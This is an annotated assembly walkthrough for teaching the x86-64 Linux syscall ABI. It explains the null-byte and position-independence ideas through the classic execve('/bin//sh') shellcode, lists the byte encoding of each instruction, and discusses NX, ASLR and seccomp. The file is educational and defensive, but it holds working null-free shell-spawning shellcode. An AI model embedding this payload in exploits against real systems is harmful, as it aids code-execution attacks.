# =============================================================================
# execve_syscall.S — an ANNOTATED WALKTHROUGH of how the execve syscall is
#                    issued on x86-64 Linux, for teaching the ABI and the
#                    null-byte concept. This is NOT a packaged injectable
#                    payload: there is no encoder, no decoder stub, and no
#                    PROT_EXEC loader. It illustrates *mechanics*.
# =============================================================================
#
# Making an execve syscall is not itself an "attack" — it is exactly what your
# shell does to launch every program, and what libc's execvp() wraps. What made
# historical *shellcode* special was (a) position independence and (b) being
# free of bytes that the injection channel would mangle (classically 0x00,
# because the channel was a strcpy). This file exists to make those two ideas
# concrete and to show *why* certain instruction choices avoid a zero byte.
#
# The System V AMD64 syscall ABI:
#     rax = syscall number         (execve is 59)
#     rdi = arg1                    (const char *pathname)
#     rsi = arg2                    (char *const argv[])
#     rdx = arg3                    (char *const envp[])
#     `syscall`                     -> traps to the kernel; rcx, r11 clobbered
#
# THE NULL-BYTE LESSON (read the byte columns in the comments):
#   * `xor %rax,%rax` encodes as 48 31 C0 — no 0x00 — and zeroes rax. Using
#     `mov $0,%rax` instead would encode a literal 0x00000000 immediate: four
#     NUL bytes, which a strcpy-delivered buffer would truncate. THIS is why
#     shellcode is written with xor-zeroing and byte/dword moves.
#   * Building the "/bin/sh" string on the stack (rather than referencing a
#     .rodata address) is the "position independent" half: no absolute address,
#     no load-time relocation.
#
# THE POINT OF THE WHOLE DIRECTORY — the defenses that make this obsolete:
#   * NX/DEP (W^X): the stack/heap are no-execute, so even if these bytes are
#     injected, the CPU faults on trying to run them. (This is why real modern
#     exploitation uses ROP over EXISTING executable code — see
#     ../10-memory-corruption-ladder.)
#   * ASLR hides addresses; seccomp (../12-syscall-sandbox) can forbid execve
#     entirely; IDS/AV match the byte signature (that is what ../nullscan and
#     asm/demo.c scan for).
#
# This walkthrough is annotated, not built into the default target. It is here
# to be READ. (`make walkthrough` will assemble it into an object for
# `objdump -d` inspection only.)
# =============================================================================

	.intel_syntax noprefix          # Intel syntax here: `op dst, src`
	.text
	.globl	shellcode_walkthrough
	.type	shellcode_walkthrough,@function
shellcode_walkthrough:                  # (illustrative label; do not inject)

	# --- 1. zero rax/rdx WITHOUT emitting a null byte ------------------------
	xor    rax, rax                 # 48 31 C0        rax = 0   (no 0x00 in encoding)
	xor    rdx, rdx                 # 48 31 D2        rdx = 0   -> envp = NULL (arg3)

	# --- 2. build "/bin/sh\0" on the stack (position independent) ------------
	# We push the 8 bytes "/bin//sh" (the doubled slash keeps it 8 bytes and is
	# path-equivalent), preceded by a NUL terminator formed from the zeroed rax.
	push   rax                      # 50              push the string terminator (0)
	mov    rbx, 0x68732f2f6e69622f  # 48 BB ...       "/bin//sh" as a little-endian qword
	                                #                 (chosen so its bytes are all nonzero;
	                                #                  reversed on the stack it reads /bin//sh)
	push   rbx                      # 53              string now lives on the stack
	mov    rdi, rsp                 # 48 89 E7        rdi = &"/bin//sh"  (arg1 = pathname)

	# --- 3. argv = { pathname, NULL } ---------------------------------------
	push   rax                      # 50              push NULL   (argv terminator)
	push   rdi                      # 57              push &pathname
	mov    rsi, rsp                 # 48 89 E6        rsi = argv  (arg2)

	# --- 4. issue execve(pathname, argv, NULL) ------------------------------
	mov    al, 59                   # B0 3B           rax = 59 = __NR_execve.
	                                #                 We write only AL (1 byte, value 0x3B)
	                                #                 because rax's top bytes are already 0
	                                #                 from the xor — avoiding a wide immediate
	                                #                 that would contain 0x00 bytes.
	syscall                         # 0F 05           trap into the kernel -> execve runs.
	                                #                 On a system with NX + seccomp this either
	                                #                 never executes (NX) or is denied (seccomp).

	.size	shellcode_walkthrough, .-shellcode_walkthrough

# Mark the stack non-executable: this object is for DISASSEMBLY/teaching, and
# declaring a non-exec stack is the very mitigation (NX) discussed above.
	.section .note.GNU-stack,"",@progbits
